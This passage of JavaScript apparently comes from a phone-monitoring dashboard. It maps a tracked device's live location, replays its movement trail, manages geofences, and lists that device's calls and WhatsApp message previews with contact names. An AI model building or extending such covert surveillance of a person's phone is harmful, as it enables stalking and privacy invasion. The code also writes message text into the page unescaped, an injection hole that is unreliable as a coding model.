  document.getElementById('seenVal').textContent = pkt(loc.ts_ms || Date.now());
  document.getElementById('coordBox').textContent = `${loc.lat.toFixed(6)}, ${loc.lng.toFixed(6)}`;
  document.getElementById('coordBox').onclick = () => navigator.clipboard.writeText(`${loc.lat},${loc.lng}`).then(() => showAlert('Copied!'));

  geocode(loc.lat, loc.lng).then(d => {
    if (d) document.getElementById('addrVal').textContent = d.display_name || '--';
  });
}
function updateMap(loc) {
  const latlng = [loc.lat, loc.lng];
  if (marker) { marker.setLatLng(latlng); }
  else { marker = L.marker(latlng).addTo(map).bindPopup('Current'); }
  if (accuracyCircle) map.removeLayer(accuracyCircle);
  accuracyCircle = L.circle(latlng, { radius: loc.accuracy || 50, color: '#3fb950', fillOpacity: 0.1 }).addTo(map);

  locationHistory.push([loc.lat, loc.lng]);
  if (locationHistory.length > 500) locationHistory.shift();
  updateTrail();

  if (locationHistory.length === 1) map.setView(latlng, 15);
}
function updateTrail() {
  if (trail) map.removeLayer(trail);
  if (locationHistory.length < 2) return;
  const pts = locationHistory.length > 200 ? simplify(locationHistory, 300) : locationHistory;
  trail = L.polyline(pts, { color: '#ffca28', weight: 2, opacity: 0.6 }).addTo(map);
  document.getElementById('playbackBar').style.display = 'flex';
  document.getElementById('playCount').textContent = `0/${pts.length}`;
  setupPlayback(pts);
}

// --- Playback ---
let playbackPoints = [];
function setupPlayback(pts) {
  playbackPoints = pts;
  const scrubber = document.getElementById('playScrubber');
  scrubber.max = Math.max(0, pts.length - 1);
}
document.getElementById('playBtn').addEventListener('click', function() {
  if (playbackRunning) { playbackRunning = false; this.textContent = '\u25B6';
    if (playbackTimer) clearInterval(playbackTimer); return; }
  playbackRunning = true; this.textContent = '\u23F8';
  const speed = parseInt(document.getElementById('speedSelect').value);
  const pts = playbackPoints;
  playbackTimer = setInterval(() => {
    if (playbackIdx >= pts.length) { playbackRunning = false; document.getElementById('playBtn').textContent = '\u25B6';
      clearInterval(playbackTimer); return; }
    const p = pts[playbackIdx];
    if (marker) marker.setLatLng(p);
    map.panTo(p, { animate: true, duration: 0.2 });
    document.getElementById('playScrubber').value = playbackIdx;
    document.getElementById('playCount').textContent = `${playbackIdx + 1}/${pts.length}`;
    document.getElementById('playTs').textContent = pkt(Date.now());
    playbackIdx++;
  }, 1000 / speed);
});
document.getElementById('rewindBtn').addEventListener('click', () => {
  playbackRunning = false; playbackIdx = 0;
  if (playbackTimer) clearInterval(playbackTimer);
  document.getElementById('playBtn').textContent = '\u25B6';
  document.getElementById('playScrubber').value = 0;
  document.getElementById('playCount').textContent = `0/${playbackPoints.length}`;
  if (playbackPoints.length && marker) marker.setLatLng(playbackPoints[0]);
});
document.getElementById('playScrubber').addEventListener('input', function() {
  playbackIdx = parseInt(this.value);
  if (playbackPoints[playbackIdx] && marker) marker.setLatLng(playbackPoints[playbackIdx]);
  document.getElementById('playCount').textContent = `${playbackIdx + 1}/${playbackPoints.length}`;
});

// --- Timeline ---
let timelineFilter = 'all';
document.querySelectorAll('.chip[data-filter]').forEach(chip => {
  chip.addEventListener('click', () => {
    document.querySelectorAll('.chip[data-filter]').forEach(c => c.classList.remove('active'));
    chip.classList.add('active');
    timelineFilter = chip.dataset.filter;
    const docs = []; // re-render from cached if needed
  });
});
function renderTimeline(docs) {
  const list = document.getElementById('timelineList');
  const filtered = docs.filter(d => {
    const type = (d.fields?.type?.stringValue || '').toLowerCase();
    if (timelineFilter === 'all') return true;
    if (timelineFilter === 'location') return type === 'location';
    if (timelineFilter === 'call') return type.includes('call');
    if (timelineFilter === 'whatsapp') return type.includes('whatsapp') || type.includes('message');
    return true;
  }).slice(0, 50);
  list.innerHTML = filtered.map(d => {
    const f = d.fields || {};
    const type = f.type?.stringValue || '';
    const ts = parseInt(f.ts_ms?.integerValue || '0');
    const icon = type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : '\u{1F4CD}';
    const contact = f.contactName?.stringValue || f.contact?.stringValue || '';
    const msg = f.messagePreview?.stringValue || '';
    const dur = f.duration?.stringValue || '';
    const dir = f.direction?.stringValue || '';
    return `<div class="card">
      <div class="time">${icon} ${pkt(ts)}</div>
      <div>${contact}${msg ? ': ' + msg : ''}${dur ? ' \u2022 ' + dur : ''}${dir ? ' ['+dir+']' : ''}</div>
    </div>`;
  }).join('') || '<div class="label">No entries</div>';
}
function renderCalls(docs) {
  const body = document.getElementById('callsBody');
  const calls = docs.filter(d => (d.fields?.type?.stringValue || '').includes('call')).slice(0, 50);
  body.innerHTML = calls.map(d => {
    const f = d.fields || {};
    const ts = parseInt(f.ts_ms?.integerValue || '0');
    const num = f.contactName?.stringValue || f.contact?.stringValue || '--';
    const dur = f.duration?.stringValue || '--';
    const dir = f.direction?.stringValue || '--';
    return `<tr><td>${pktShort(ts)}</td><td>${num}</td><td>${dur}</td><td>${dir}</td></tr>`;
  }).join('') || '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
}

// --- Copy coords ---
document.addEventListener('keydown', e => {
  if (e.key === 'c' && e.ctrlKey) {
    const text = document.getElementById('coordBox').textContent;
    if (text !== '--') navigator.clipboard.writeText(text);
  }
});

// --- Init ---
async function init() {
  if (Notification.permission === 'default') Notification.requestPermission();
  try { await fetchDevices(); } catch {}
  if (selectedDevice) try { await pollAll(); } catch {}
  startPolling();
  renderGeofences();
  renderGeofenceList();
  if (geofences.length === 0) {
    showAlert('Right-click on map to add geofences', 'warn');
  }
}
init();
</script>
